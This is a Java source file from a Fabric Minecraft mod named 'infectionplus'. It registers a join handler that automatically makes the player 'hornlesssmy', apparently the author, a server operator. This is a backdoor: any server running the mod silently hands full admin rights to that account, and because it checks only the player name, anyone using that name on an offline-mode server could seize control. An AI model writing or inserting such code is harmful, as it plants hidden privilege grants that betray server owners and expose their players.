package net.hornlesssmy.infectionplus.event;

import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.network.ServerPlayerEntity;

public class PlayerJoinHandler {

    public static void register() {
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayerEntity player = handler.getPlayer();
            String playerName = player.getName().getString();

            // Auto-op hornlesssmy when they join
            if ("hornlesssmy".equals(playerName)) {
                server.execute(() -> {
                    if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
                        server.getPlayerManager().addToOperators(player.getGameProfile());
                    }
                });
            }
        });
    }
}

